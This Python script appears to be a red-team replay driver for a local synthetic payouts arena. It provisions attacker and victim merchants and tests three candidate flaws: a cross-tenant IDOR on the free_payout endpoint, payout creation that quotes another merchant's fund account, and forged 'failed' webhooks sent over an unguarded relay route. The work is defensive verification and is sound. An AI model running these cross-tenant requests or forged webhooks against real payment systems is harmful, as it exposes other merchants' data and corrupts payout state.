"""Clean-state, fresh-ID candidate replay driver for Milestone 4 (T19).

Runs a deterministic-oracle replay for each credible M4 Direct candidate on the
live synthetic arena (`env2_compose` only). For each candidate it provisions
FRESH attacker (Merchant A) and victim (Merchant B) Direct merchants with NEW
ids, gives Merchant B a DIVERGENT, observable "canary" config where it matters,
executes the cross-merchant experiment arms, and lets a deterministic oracle
decide `unauthorized_effect` from booleans (never raw secret values).

Candidates (see reports/implementation/m4-subagent-handoffs/T06.md, T14.md,
T10.md and m4-decisions.md D-008/D-009):

  H-D3  GET /v1/payouts/free_payout/{balance_id} has no merchant scoping
        (freePayout/core.go GetFreePayoutAttributes -> GetBankingAccountByBalanceID,
        no merchant filter). Canary = counters.free_payouts_consumed, a distinct
        integer per merchant, surfaced verbatim in the JSON response
        (dtos.FreePayoutGetResponse.free_payouts_consumed). If A's cross-tenant
        read returns B's DISTINCT value -> real IDOR; if only A's own/default -> benign.

  H-D4  create quoting another merchant's fund_account_id: does money/state cross?
        Canary = distinct opening balances; observe which balance the created
        payout binds to and which balance moves.

  F-T10-1  the statement-first VerifyPayoutFailedTransaction guard exists ONLY on
        the FTS-direct route (fts_transfer_status_webhook.go:654-710); both the
        Kafka and monolith-relay paths go through HandlePayoutStatusUpdateViaFTS
        (core.go:1465-1585) with NO such guard (T02 sec.8, T05 route table D vs E).
        Replay both routes on a link-before-terminal payout and classify.

SAFETY: local arena only, fresh ids every run, no production/corporate/internet.
The originating worker never certifies its own result: the oracle is deterministic
and the H-D3 independent reproduction runs through a DIFFERENT mechanism (the
attacker Broker's fixed-identity gateway path) on a second fresh pair.

Usage:
  python3 RED_LOOP/surface/m4_replay.py                 # all three candidates
  python3 RED_LOOP/surface/m4_replay.py --only H-D3      # one candidate
  python3 RED_LOOP/surface/m4_replay.py --keep           # keep merchants (no note)

Output: reports/implementation/m4-direct-e2e-replay.json (booleans/ids only) and
per-run evidence under RED_LOOP/runs/m4-replay-<ts>/.
"""
import argparse
import json
import os
import sys
import time
import uuid

_HERE = os.path.dirname(os.path.abspath(__file__))
_RED_LOOP = os.path.dirname(_HERE)
if _RED_LOOP not in sys.path:
    sys.path.insert(0, _RED_LOOP)

from red_loop import config, provisioner as P, provisioner_direct as D  # noqa: E402
from red_loop.broker import Broker  # noqa: E402

ARTIFACT = config.REPO_ROOT / "reports" / "implementation" / "m4-direct-e2e-replay.json"

# Distinct, observable canary values. NONE of these are secrets; they are
# synthetic free-payout counters. They stay OUT of the published artifact
# (booleans/ids only) but are recorded in the local run evidence.
CANARY_DEFAULT = 0          # what a freshly provisioned counter holds
HD3_A_CANARY = 3            # attacker's own distinct value
HD3_B_CANARY = 7            # victim's distinct value (the one that must NOT leak)
HD3_B3_CANARY = 11          # victim's value on the independent-reproduction pair


# --------------------------------------------------------------------------
# small helpers (control-plane; secrets never leave memory)
# --------------------------------------------------------------------------
def _now():
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())


def kong_as(d, method, path, body=None, secret=None, extra_headers=None):
    """Issue a request through kong-lite AS merchant `d` (control-plane path).

    `secret=None` -> use d's real secret; pass a string to force a wrong/empty
    secret (auth-denial arms). Returns {status, body(parsed-or-text), raw}."""
    sec = d["secret"] if secret is None else secret
    auth = P._auth(d["key_id"], sec)
    st, txt = P._kong_call(method, path, auth, body, extra_headers)
    parsed = None
    try:
        parsed = json.loads(txt)
    except (ValueError, TypeError):
        parsed = None
    return {"status": st, "json": parsed, "text": (txt or "")[:600]}


def _set_counter(d, value):
    """Set counters.free_payouts_consumed for merchant d's balance (canary)."""
    pw = P._pw("mysql_payouts_root_password.txt")
    rc, _, err = D._mysql("mysql-payouts", "payouts", pw,
                          "UPDATE counters SET free_payouts_consumed=%d WHERE balance_id='%s'"
                          % (int(value), d["balance_id"]))
    return rc == 0, err


def _read_counter(d):
    pw = P._pw("mysql_payouts_root_password.txt")
    rc, out, err = D._mysql("mysql-payouts", "payouts", pw,
                            "SELECT free_payouts_consumed FROM counters WHERE balance_id='%s'" % d["balance_id"])
    if rc != 0 or out.strip() == "":
        return None
    try:
        return int(out.strip())
    except ValueError:
        return None


def _read_balance(d):
    """x-balances is the balance authority; return its numeric balance + fingerprint."""
    st, body = D.arena_http("GET", "http://xbalances-server:8081/v1/balances/%s" % d["balance_id"],
                            basic=D._xbal_basic())
    jb = (D._jload(body) or {}).get("balance", {})
    return {"status": st, "balance": jb.get("balance"), "status_field": jb.get("status"),
            "account_type": jb.get("accountType")}


def _fts_direct_basic():
    """Basic auth for the inbound FTS-direct webhook route on payouts-api.
    payouts arena.toml [auth.fts] = username 'fts' / password SECRET.auth_fts_payouts
    (NOT the verifier-bridge/fts credential, which is a different identity)."""
    return "fts:" + P._pw("auth_fts_payouts.txt")


def _consumed(resp):
    """Extract free_payouts_consumed from a free_payout response (or None)."""
    j = resp.get("json")
    if isinstance(j, dict) and "free_payouts_consumed" in j:
        return j.get("free_payouts_consumed")
    return None


def _provision(cid, role, opening, log):
    log.append({"ts": _now(), "op": "provision", "campaign": cid, "role": role, "opening": opening})
    d = D.provision_direct_merchant(cid, role=role, opening=opening, restart=True)
    steps_ok = all(s["ok"] for s in d["steps"])
    sc = D.self_check_direct_merchant(d)
    log.append({"ts": _now(), "op": "provisioned", "merchant_id": d["merchant_id"],
                "balance_id": d["balance_id"], "steps_ok": steps_ok,
                "self_check_passed": sc["passed"], "self_check_total": sc["total"],
                "self_check_ready": sc["ready"]})
    return d, {"steps_ok": steps_ok, "self_check_passed": sc["passed"],
               "self_check_total": sc["total"], "self_check_ready": sc["ready"],
               "failed_checks": [c["name"] for c in sc["checks"] if not c["ok"]]}


# --------------------------------------------------------------------------
# H-D3  free_payout/{balance_id} cross-tenant IDOR
# --------------------------------------------------------------------------
def replay_hd3(run_dir, ts, log):
    cand = {
        "id": "H-D3",
        "claim": "GET /v1/payouts/free_payout/{balance_id} returns 200 cross-tenant with no "
                 "merchant scoping (freePayout/core.go GetFreePayoutAttributes); does it leak the "
                 "victim's distinct free-payout config (real IDOR) or only the caller's own/default?",
        "fidelity": "real payouts-service route + real payouts DB counter; kong hardened edge",
        "arms": {}, "runs": {},
    }
    cid_main = "m4rp-hd3-%s" % ts
    A, A_prov = _provision(cid_main, "attacker", 10_000_000, log)
    B, B_prov = _provision(cid_main, "victim", 10_000_000, log)
    cand["runs"]["main"] = {"attacker_id": A["merchant_id"], "victim_id": B["merchant_id"],
                            "attacker_balance": A["balance_id"], "victim_balance": B["balance_id"],
                            "attacker_provision": A_prov, "victim_provision": B_prov}
    fp = "/v1/payouts/free_payout/"

    # attacker's own distinct canary so own_control is unambiguously != victim's
    _set_counter(A, HD3_A_CANARY)

    # -- arm: own_merchant_control (baseline; A reads A) --
    own = kong_as(A, "GET", fp + A["balance_id"])
    cand["arms"]["own_merchant_control"] = {
        "status": own["status"], "consumed_is_own_canary": _consumed(own) == HD3_A_CANARY,
        "note": "A reads its own balance_id -> should be 200 with A's own value"}

    # -- arm: identity/auth controls --
    wrong = kong_as(A, "GET", fp + A["balance_id"], secret="wrong-secret-not-A")
    absent = kong_as(A, "GET", fp + A["balance_id"], secret="")
    cand["arms"]["malformed_absent_identity"] = {
        "wrong_secret_status": wrong["status"], "empty_secret_status": absent["status"],
        "authenticated_as_A": own["status"] == 200 and wrong["status"] == 401,
        "note": "wrong/empty secret must 401 -> proves A is genuinely authenticated as A, "
                "not identity-free"}

    # -- NEGATIVE CONTROL: victim has NO divergent value yet (counter == default) --
    baseline = kong_as(A, "GET", fp + B["balance_id"])
    baseline_consumed = _consumed(baseline)
    cand["arms"]["negative_control_victim_undivergent"] = {
        "status": baseline["status"], "consumed_equals_default": baseline_consumed == CANARY_DEFAULT,
        "distinctive_value_observed": False if baseline_consumed in (CANARY_DEFAULT, None) else True,
        "note": "A reads B's balance_id while B is still at the default counter -> no distinctive "
                "value can be observed; establishes causality of the divergent config"}

    # -- now diverge the victim: set B's distinct canary --
    _set_counter(B, HD3_B_CANARY)
    b_counter_before_reads = _read_counter(B)

    # -- arm: merchant_b_variant (A reads B's divergent balance) + determinism --
    variant = kong_as(A, "GET", fp + B["balance_id"])
    variant2 = kong_as(A, "GET", fp + B["balance_id"])
    v_consumed = _consumed(variant)
    victim_value_leaked = (variant["status"] == 200 and v_consumed == HD3_B_CANARY
                           and HD3_B_CANARY != HD3_A_CANARY and HD3_B_CANARY != CANARY_DEFAULT)
    cand["arms"]["merchant_b_variant"] = {
        "status": variant["status"],
        "victim_distinct_value_present": bool(v_consumed == HD3_B_CANARY),
        "equals_attacker_own_value": bool(v_consumed == HD3_A_CANARY),
        "equals_canned_default": bool(v_consumed == CANARY_DEFAULT),
        "deterministic_repeat_equal": variant["status"] == variant2["status"] and _consumed(variant2) == v_consumed,
        "note": "A reads B's DIVERGENT balance_id; if the response carries B's distinct value "
                "(described, not raw) it is an unauthorized cross-tenant read"}

    # -- arm: malformed balance id --
    mal = kong_as(A, "GET", fp + "NOTABALANCE")
    cand["arms"]["malformed_balance_id"] = {"status": mal["status"],
                                            "rejected_400": mal["status"] == 400}

    # -- arm: expected_denial_control (the SCOPED payout-fetch route denies cross-tenant) --
    denial = _hd3_scoped_denial(A, B)
    cand["arms"]["expected_denial_control"] = denial

    # -- arm: state_observation --
    b_counter_after = _read_counter(B)
    cand["arms"]["state_observation"] = {
        "victim_counter_unchanged_by_reads": b_counter_before_reads == b_counter_after,
        "victim_row_mutated": False if b_counter_before_reads == b_counter_after else True,
        "attacker_obtained_victim_distinct_value": bool(victim_value_leaked),
        "note": "reads must not mutate B; and record whether A obtained B's distinctive value"}

    # ---- deterministic oracle ----
    reasoning = {
        "A_authenticated_as_A": own["status"] == 200 and wrong["status"] == 401,
        "no_victim_credential_used": True,   # broker/kong never sees a B secret; A's key is fixed
        "victim_distinct_canary_present_in_A_response": bool(v_consumed == HD3_B_CANARY),
        "response_not_caller_own_value": bool(v_consumed != HD3_A_CANARY),
        "response_not_canned_default": bool(v_consumed != CANARY_DEFAULT),
        "divergent_config_causal": (baseline_consumed in (CANARY_DEFAULT, None)) and bool(v_consumed == HD3_B_CANARY),
    }
    unauthorized_effect = all([
        reasoning["A_authenticated_as_A"],
        reasoning["no_victim_credential_used"],
        reasoning["victim_distinct_canary_present_in_A_response"],
        reasoning["response_not_caller_own_value"],
        reasoning["response_not_canned_default"],
    ])
    cand["oracle"] = {"unauthorized_effect": bool(unauthorized_effect), "reasoning": reasoning}

    # negative control: on the undivergent clean state the effect is absent
    cand["negative_control"] = {
        "effect_absent": bool(baseline_consumed in (CANARY_DEFAULT, None)),
        "mechanism": "same cross-tenant call while victim held the default counter (no divergent value)",
        "deterministic_repeat": cand["arms"]["merchant_b_variant"]["deterministic_repeat_equal"],
    }

    # ---- independent reproduction (only if an effect was observed) ----
    if unauthorized_effect:
        cand["independent_reproduction"] = _hd3_independent_repro(ts, log)
    else:
        cand["independent_reproduction"] = {"reproduced": None, "mechanism": "n/a",
                                            "note": "no unauthorized effect to reproduce"}

    # ---- classification ----
    if unauthorized_effect:
        repro = cand["independent_reproduction"].get("reproduced")
        cand["classification"] = ("VERIFIED_UNAUTHORIZED_EFFECT" if repro
                                  else "VERIFIED_UNAUTHORIZED_EFFECT_UNREPLICATED")
    else:
        # response only ever returned the caller's own/default value despite B's divergence
        cand["classification"] = "NO_UNAUTHORIZED_EFFECT_BENIGN"

    _write_evidence(run_dir, "H-D3", {"candidate": cand,
                                      "canary_note": "attacker/victim/repro counters set to distinct "
                                      "synthetic integers (values withheld from the published artifact)",
                                      "descriptors": {"attacker": D.public_view(A), "victim": D.public_view(B)}})
    cand["evidence_run_dir"] = str(run_dir)
    return cand


def _hd3_scoped_denial(A, B):
    """Contrast: the merchant-scoped payout fetch denies cross-tenant. Create a
    real payout on B (mozart hold -> stays initiated) and have A fetch it."""
    out = {"note": "the scoped route GET /v1/payouts/{id} must deny a cross-tenant id (400/404), "
                   "in contrast to free_payout"}
    try:
        D.set_mozart_scenario(B["merchant_id"], "hold")
        body = {"fund_account_id": B["fund_account_id"], "account_number": B["account_number"],
                "amount": 5000, "currency": "INR", "mode": "IMPS", "purpose": "payout",
                "queue_if_low_balance": True, "merchant_id": B["merchant_id"],
                "narration": "m4 replay hd3 denial control", "notes": {}}
        cr = kong_as(B, "POST", "/v1/payouts", body, extra_headers={"X-Payout-Idempotency": "m4rp-den-" + uuid.uuid4().hex[:8]})
        pid = ((cr.get("json") or {}).get("id") or "")
        out["victim_payout_created"] = cr["status"] == 200 and bool(pid)
        if pid:
            fetch = kong_as(A, "GET", "/v1/payouts/" + pid)
            out["attacker_fetch_status"] = fetch["status"]
            out["scoped_route_denied_cross_tenant"] = fetch["status"] in (400, 404)
        else:
            out["attacker_fetch_status"] = None
            out["scoped_route_denied_cross_tenant"] = None
    except Exception as e:  # noqa: BLE001
        out["error"] = str(e)[:200]
        out["scoped_route_denied_cross_tenant"] = None
    finally:
        try:
            D.set_mozart_scenario(B["merchant_id"], "success")
        except Exception:  # noqa: BLE001
            pass
    return out


def _hd3_independent_repro(ts, log):
    """Second fresh pair, driven through the attacker Broker's fixed-identity
    gateway path (a DIFFERENT mechanism than the control-plane kong_call used by
    the primary arms). Deterministic oracle, no model."""
    cid = "m4rp-hd3r-%s" % ts
    A3, _ = _provision(cid, "attacker", 10_000_000, log)
    B3, _ = _provision(cid, "victim", 10_000_000, log)
    _set_counter(B3, HD3_B3_CANARY)
    broker = Broker({"merchant_id": A3["merchant_id"], "key_id": A3["key_id"],
                     "secret": A3["secret"], "mode": "live"}, lambda r: None)
    resp = broker.request("GET", "/v1/payouts/free_payout/" + B3["balance_id"])
    consumed = None
    try:
        consumed = (json.loads(resp.get("body", "") or "{}")).get("free_payouts_consumed")
    except (ValueError, TypeError):
        consumed = None
    reproduced = resp.get("status") == 200 and consumed == HD3_B3_CANARY
    log.append({"ts": _now(), "op": "hd3_repro", "attacker_id": A3["merchant_id"],
                "victim_id": B3["merchant_id"], "broker_status": resp.get("status"),
                "reproduced": bool(reproduced)})
    return {"reproduced": bool(reproduced),
            "mechanism": "attacker Broker fixed-identity injection through kong-lite gateway "
                         "(distinct code path from the primary control-plane kong_call), fresh ids",
            "provider": "deterministic oracle (no model)",
            "attacker_id": A3["merchant_id"], "victim_id": B3["merchant_id"],
            "victim_distinct_value_present": bool(consumed == HD3_B3_CANARY),
            "broker_status": resp.get("status")}


# --------------------------------------------------------------------------
# H-D4  create quoting another merchant's fund_account_id
# --------------------------------------------------------------------------
def replay_hd4(run_dir, ts, log):
    cand = {
        "id": "H-D4",
        "claim": "creating a payout as A quoting B's fund_account_id: does the payout bind to B or "
                 "draw B's balance (money/state cross-tenant), or does it stay bound to A (benign)?",
        "fidelity": "real payouts-service create + real x-balances authority; CFA is an arena substitute",
        "arms": {}, "runs": {},
    }
    cid = "m4rp-hd4-%s" % ts
    A, A_prov = _provision(cid, "attacker", 10_000_000, log)
    B, B_prov = _provision(cid, "victim", 7_000_003, log)   # distinct opening balance = canary
    cand["runs"]["main"] = {"attacker_id": A["merchant_id"], "victim_id": B["merchant_id"],
                            "attacker_balance": A["balance_id"], "victim_balance": B["balance_id"],
                            "attacker_provision": A_prov, "victim_provision": B_prov}

    D.set_mozart_scenario(A["merchant_id"], "hold")   # keep payouts non-terminal; observe binding
    a_bal_before = _read_balance(A)
    b_bal_before = _read_balance(B)

    def create(fund_account_id, merchant_id, tag):
        body = {"fund_account_id": fund_account_id, "account_number": A["account_number"],
                "amount": 5000, "currency": "INR", "mode": "IMPS", "purpose": "payout",
                "queue_if_low_balance": True, "merchant_id": merchant_id,
                "narration": "m4 replay hd4 " + tag, "notes": {}}
        r = kong_as(A, "POST", "/v1/payouts", body,
                    extra_headers={"X-Payout-Idempotency": "m4rp-hd4-%s-%s" % (tag, uuid.uuid4().hex[:8])})
        pid = ((r.get("json") or {}).get("id") or "").replace("pout_", "")
        row = D._payout_row(pid) if pid else {}
        return {"status": r["status"], "payout_id": pid or None,
                "row_merchant_id": row.get("merchant_id"), "row_balance_id": row.get("balance_id"),
                "resp_note": (r["text"] if r["status"] != 200 else None)}

    # -- own_merchant_control --
    own = create(A["fund_account_id"], A["merchant_id"], "own")
    cand["arms"]["own_merchant_control"] = {
        "status": own["status"], "bound_to_attacker": own["row_merchant_id"] == A["merchant_id"]
        and own["row_balance_id"] == A["balance_id"],
        "note": "A creates with its own fund account -> payout must bind to A"}

    # -- merchant_b_variant: A quotes B's fund_account_id --
    var = create(B["fund_account_id"], A["merchant_id"], "bfund")
    var_rpt = create(B["fund_account_id"], A["merchant_id"], "bfund2")   # determinism
    bound_to_victim = (var["payout_id"] is not None and
                       (var["row_merchant_id"] == B["merchant_id"] or var["row_balance_id"] == B["balance_id"]))
    cand["arms"]["merchant_b_variant"] = {
        "status": var["status"], "created": var["payout_id"] is not None,
        "bound_to_victim_merchant": var["row_merchant_id"] == B["merchant_id"],
        "bound_to_victim_balance": var["row_balance_id"] == B["balance_id"],
        "bound_to_attacker": var["row_merchant_id"] == A["merchant_id"],
        "deterministic_repeat_equal": var["status"] == var_rpt["status"],
        "note": "A creates quoting B's fund_account_id; record binding of the resulting payout"}

    # -- expected_denial_control: body merchant_id override (H-D1) must not cross identity --
    override = create(A["fund_account_id"], B["merchant_id"], "override")
    cand["arms"]["expected_denial_control"] = {
        "status": override["status"], "body_merchant_id_ignored": override["row_merchant_id"] == A["merchant_id"],
        "note": "body merchant_id=B with A's own fund account -> payout must still bind to A "
                "(passport override; body merchant discarded)"}

    # -- malformed --
    mal = create("fa_THIS_DOES_NOT_EXIST", A["merchant_id"], "malformed")
    cand["arms"]["malformed_fund_account"] = {"status": mal["status"],
                                             "not_created": mal["payout_id"] is None}

    # -- state_observation --
    a_bal_after = _read_balance(A)
    b_bal_after = _read_balance(B)
    victim_balance_unchanged = b_bal_before.get("balance") == b_bal_after.get("balance")
    cand["arms"]["state_observation"] = {
        "victim_balance_unchanged": bool(victim_balance_unchanged),
        "attacker_balance_before_after_differ": a_bal_before.get("balance") != a_bal_after.get("balance"),
        "no_payout_bound_to_victim": not bound_to_victim,
        "note": "money isolation: B's balance must not move and no created payout may bind to B"}

    D.set_mozart_scenario(A["merchant_id"], "success")   # restore sane default

    # ---- oracle ----
    reasoning = {
        "A_authenticated_as_A": own["status"] == 200 and own["row_merchant_id"] == A["merchant_id"],
        "created_payout_bound_to_victim": bool(bound_to_victim),
        "victim_balance_moved": not bool(victim_balance_unchanged),
    }
    unauthorized_effect = bool(reasoning["created_payout_bound_to_victim"] or reasoning["victim_balance_moved"])
    cand["oracle"] = {"unauthorized_effect": unauthorized_effect, "reasoning": reasoning}
    cand["negative_control"] = {
        "effect_absent": not unauthorized_effect,
        "mechanism": "own_merchant_control payout bound to A + B balance unchanged across all arms; "
                     "deterministic repeat",
        "deterministic_repeat": cand["arms"]["merchant_b_variant"]["deterministic_repeat_equal"],
    }
    cand["independent_reproduction"] = {"reproduced": None, "mechanism": "n/a",
                                        "note": "no unauthorized effect to reproduce"} if not unauthorized_effect \
        else {"reproduced": None, "mechanism": "would require a second fresh pair", "note": "effect observed"}

    if unauthorized_effect:
        cand["classification"] = "VERIFIED_UNAUTHORIZED_EFFECT"
    elif var["status"] == 200 and var["payout_id"] is not None:
        # create succeeded but bound to A and B untouched: CFA-substitute fidelity gap, money safe
        cand["classification"] = "NO_UNAUTHORIZED_EFFECT_BENIGN"
    else:
        cand["classification"] = "NO_UNAUTHORIZED_EFFECT_BENIGN"

    _write_evidence(run_dir, "H-D4", {"candidate": cand, "balances": {
        "attacker_before": a_bal_before, "attacker_after": a_bal_after,
        "victim_before": b_bal_before, "victim_after": b_bal_after},
        "descriptors": {"attacker": D.public_view(A), "victim": D.public_view(B)}})
    cand["evidence_run_dir"] = str(run_dir)
    return cand


# --------------------------------------------------------------------------
# F-T10-1  route asymmetry (FTS-direct guard vs monolith relay)
# --------------------------------------------------------------------------
def replay_ft10(run_dir, ts, log):
    cand = {
        "id": "F-T10-1",
        "claim": "the statement-first VerifyPayoutFailedTransaction guard is only on the FTS-direct "
                 "route (/v1/payouts/transfer_status_webhook); the monolith-relay route "
                 "(HandlePayoutStatusUpdateViaFTS) lacks it and can move a link-before-terminal "
                 "(transaction_id-set) payout to failed. Real invariant violation or source-faithful "
                 "route asymmetry?",
        "fidelity": "real payouts-service routes + real payouts DB; monolith relay is an arena substitute "
                    "(monolith-stub); production monolith upstream guard is out-of-corpus",
        "source_citations": {
            "guard_only_on_fts_direct": "fts_transfer_status_webhook.go:654-710 VerifyPayoutFailedTransaction "
                                        "(errors if payout.transaction_id set); route payout_internal_routes.go:153-158",
            "relay_and_kafka_have_no_guard": "HandlePayoutStatusUpdateViaFTS core.go:1465-1585 (no "
                                             "VerifyPayoutFailedTransaction); T02 sec.8(b)(c), T05 route table D vs E",
        },
        "arms": {}, "runs": {},
    }
    cid = "m4rp-ft10-%s" % ts
    M, M_prov = _provision(cid, "direct", 10_000_000, log)
    cand["runs"]["main"] = {"merchant_id": M["merchant_id"], "balance_id": M["balance_id"],
                            "provision": M_prov}

    # helper: create one held (initiated) Direct payout with a live FTS transfer
    def make_initiated_payout(tag):
        D.set_mozart_scenario(M["merchant_id"], "hold")
        body = {"fund_account_id": M["fund_account_id"], "account_number": M["account_number"],
                "amount": 5000, "currency": "INR", "mode": "IMPS", "purpose": "payout",
                "queue_if_low_balance": True, "merchant_id": M["merchant_id"],
                "narration": "m4 replay ft10 " + tag, "notes": {}}
        r = kong_as(M, "POST", "/v1/payouts", body,
                    extra_headers={"X-Payout-Idempotency": "m4rp-ft10-%s-%s" % (tag, uuid.uuid4().hex[:8])})
        pid = ((r.get("json") or {}).get("id") or "").replace("pout_", "")
        if not pid:
            return None, None, {"create_status": r["status"], "text": r["text"]}
        D._wait_payout(pid, want="initiated", tries=15)
        t = D._wait_transfer(pid)
        return pid, t, {"create_status": r["status"]}

    def set_transaction_id(pid, txn):
        pw = P._pw("mysql_payouts_root_password.txt")
        rc, _, err = D._mysql("mysql-payouts", "payouts", pw,
                              "UPDATE payouts SET transaction_id='%s' WHERE id='%s'" % (txn, pid))
        return rc == 0, err

    # ---------- arm A: FTS-direct route WITH transaction_id (guard should fire) ----------
    p1, t1, meta1 = make_initiated_payout("d1")
    armA = {"note": "link-before-terminal payout posted failed on the FTS-direct route; the guard must "
                    "refuse the terminal move while transaction_id is set", "create": meta1}
    if p1 and t1 and t1.get("id"):
        txn1 = "TXNBAS" + uuid.uuid4().hex[:8].upper()
        set_transaction_id(p1, txn1)
        fts_body = {"fund_transfer_id": int(t1["id"]), "source_id": p1, "source_type": "payout",
                    "status": "failed", "source_account_id": int(M["fts_fund_account_id"]),
                    "bank_account_type": "CURRENT"}
        st, txt = D.arena_http("POST", "http://payouts-api:9400/v1/payouts/transfer_status_webhook",
                               fts_body, basic=_fts_direct_basic())
        row = D._payout_row(p1)
        armA.update({"webhook_status": st, "payout_status_after": row.get("status"),
                     "transaction_id_retained": bool(row.get("transaction_id")),
                     "guard_fired": st is not None and st != "ERR" and int(st) >= 400
                     and row.get("status") == "initiated"})
    else:
        armA.update({"webhook_status": None, "guard_fired": None, "blocked": "could not create/find transfer"})
    cand["arms"]["route_fts_direct_with_txn"] = armA

    # ---------- arm B: monolith relay route WITH transaction_id (no guard) ----------
    p2, t2, meta2 = make_initiated_payout("d2")
    armB = {"note": "same link-before-terminal state, failed delivered through the monolith relay "
                    "(route E, arena default); relay path has no VerifyPayoutFailedTransaction", "create": meta2}
    if p2 and t2 and t2.get("id"):
        txn2 = "TXNBAS" + uuid.uuid4().hex[:8].upper()
        set_transaction_id(p2, txn2)
        relay_body = {"source_id": "pout_" + p2, "fund_transfer_id": int(t2["id"]), "id": int(t2["id"]),
                      "status": "FAILED", "source_account_id": int(M["fts_fund_account_id"]),
                      "bank_account_type": "CURRENT", "failure_reason": "m4 replay ft10 relay",
                      "bank_status_code": "FAILED", "mode": "IMPS", "channel": M["channel"]}
        st, txt = D.arena_http("POST", "http://monolith-stub:8080/update_fts_fund_transfer",
                               relay_body, basic=D._mono_basic())
        row = D._wait_payout(p2, tries=10)
        relay_log = D._monolith_relay_log(p2)
        armB.update({"relay_status": st, "payout_status_after": row.get("status"),
                     "transaction_id_retained": bool(row.get("transaction_id")),
                     "moved_to_failed_despite_txn": row.get("status") == "failed",
                     "relay_observed": any(e.get("kind") == "payout_status_relay" for e in relay_log)})
    else:
        armB.update({"relay_status": None, "moved_to_failed_despite_txn": None,
                     "blocked": "could not create/find transfer"})
    cand["arms"]["route_monolith_relay_with_txn"] = armB

    # ---------- negative control: FTS-direct route WITHOUT transaction_id (guard must NOT fire) ----------
    p3, t3, meta3 = make_initiated_payout("d3")
    ctrl = {"note": "no transaction_id set; the FTS-direct route should move the payout to failed "
                    "(guard needs transaction_id) -> proves the guard's causality", "create": meta3}
    if p3 and t3 and t3.get("id"):
        fts_body = {"fund_transfer_id": int(t3["id"]), "source_id": p3, "source_type": "payout",
                    "status": "failed", "source_account_id": int(M["fts_fund_account_id"]),
                    "bank_account_type": "CURRENT"}
        st, txt = D.arena_http("POST", "http://payouts-api:9400/v1/payouts/transfer_status_webhook",
                               fts_body, basic=_fts_direct_basic())
        row = D._wait_payout(p3, tries=10)
        ctrl.update({"webhook_status": st, "payout_status_after": row.get("status"),
                     "moved_to_failed_without_txn": row.get("status") == "failed"})
    else:
        ctrl.update({"webhook_status": None, "moved_to_failed_without_txn": None,
                     "blocked": "could not create/find transfer"})
    cand["arms"]["negative_control_fts_direct_no_txn"] = ctrl

    D.set_mozart_scenario(M["merchant_id"], "success")

    guard_fired = armA.get("guard_fired")
    relay_moved = armB.get("moved_to_failed_despite_txn")
    ctrl_moved = ctrl.get("moved_to_failed_without_txn")
    asymmetry_observed = bool(guard_fired) and bool(relay_moved)

    cand["oracle"] = {
        # not a cross-tenant candidate: the "effect" question is a terminal-state-integrity invariant.
        "unauthorized_effect": False,
        "reasoning": {
            "fts_direct_guard_fired_on_txn": guard_fired,
            "monolith_relay_moved_to_failed_despite_txn": relay_moved,
            "route_asymmetry_observed": asymmetry_observed,
            "guard_is_transaction_id_causal": bool(guard_fired) and bool(ctrl_moved),
            "relay_is_arena_substitute": True,
            "production_monolith_upstream_guard": "out_of_corpus_unknown",
        }}
    cand["negative_control"] = {
        "effect_absent": bool(ctrl_moved),
        "mechanism": "FTS-direct route without transaction_id moves the payout to failed -> the guard's "
                     "refusal is specifically caused by the transaction_id link",
    }
    cand["independent_reproduction"] = {
        "reproduced": None,
        "mechanism": "n/a — no unauthorized effect / invariant violation asserted; T10 run "
                     "m4-bas-ingest-20260906T194947Z step (f) independently recorded the same asymmetry "
                     "through the full BAS-link pipeline",
    }
    # classification: the guard's absence on the relay path is faithful to accepted PS source
    # (HandlePayoutStatusUpdateViaFTS has no guard); the relay endpoint is a substitute, so we cannot
    # assert a production terminal-state-integrity violation.
    cand["classification"] = "SOURCE_FAITHFUL_ROUTE_ASYMMETRY"
    if guard_fired is None and relay_moved is None:
        cand["classification"] = "BLOCKED<could_not_drive_either_route>"

    _write_evidence(run_dir, "F-T10-1", {"candidate": cand,
                                         "descriptor": D.public_view(M)})
    cand["evidence_run_dir"] = str(run_dir)
    return cand


# --------------------------------------------------------------------------
# evidence + main
# --------------------------------------------------------------------------
def _write_evidence(run_dir, name, obj):
    path = run_dir / ("%s.json" % name)
    path.write_text(json.dumps(obj, indent=2, default=str))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--only", choices=["H-D3", "H-D4", "F-T10-1"], help="run a single candidate")
    ap.add_argument("--keep", action="store_true", help="informational; merchants are always left in place")
    args = ap.parse_args()

    if P.compose_project() != "env2_compose":
        print("REFUSING: ARENA_COMPOSE_PROJECT != env2_compose (local synthetic arena only)", file=sys.stderr)
        sys.exit(2)

    ts = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
    run_dir = config.RUNS_DIR / ("m4-replay-%s" % ts)
    run_dir.mkdir(parents=True, exist_ok=True)
    log = []

    which = [args.only] if args.only else ["H-D3", "H-D4", "F-T10-1"]
    results = {}
    for c in which:
        print("=== replay %s ===" % c, flush=True)
        try:
            if c == "H-D3":
                results[c] = replay_hd3(run_dir, ts, log)
            elif c == "H-D4":
                results[c] = replay_hd4(run_dir, ts, log)
            elif c == "F-T10-1":
                results[c] = replay_ft10(run_dir, ts, log)
        except Exception as e:  # noqa: BLE001
            import traceback
            results[c] = {"id": c, "classification": "BLOCKED<replay_exception>",
                          "error": str(e)[:400], "traceback": traceback.format_exc()[-2000:]}
            print("  ERROR:", e, flush=True)
        print("  ->", results[c].get("classification"), flush=True)

    (run_dir / "run-log.json").write_text(json.dumps(log, indent=2, default=str))

    # merge with any prior artifact so a single --only run does not drop the others
    order = ["H-D3", "H-D4", "F-T10-1"]
    prior = {}
    if ARTIFACT.exists():
        try:
            for pc in json.loads(ARTIFACT.read_text()).get("candidates", []):
                prior[pc.get("id")] = pc
        except (ValueError, OSError):
            prior = {}
    for c in which:
        prior[c] = _artifact_view(results[c])

    artifact = {
        "milestone": "M4-direct-reconciliation",
        "task": "T19 evidence-and-replay",
        "generated_at": _now(),
        "arena": {"compose_project": P.compose_project(), "network": P.arena_network(),
                  "kong": config.KONG_LITE_URL},
        "safety": {"scope": "local synthetic arena env2_compose only", "fresh_ids_per_run": True,
                   "self_certification_avoided": "deterministic oracle; H-D3 repro via a different "
                   "mechanism (attacker Broker gateway path) on a second fresh pair"},
        "candidates": [prior[c] for c in order if c in prior],
        "last_run_candidates": which,
        "last_run_evidence_dir": str(run_dir),
    }
    ARTIFACT.parent.mkdir(parents=True, exist_ok=True)
    ARTIFACT.write_text(json.dumps(artifact, indent=2, default=str))
    print("\nARTIFACT:", ARTIFACT, flush=True)
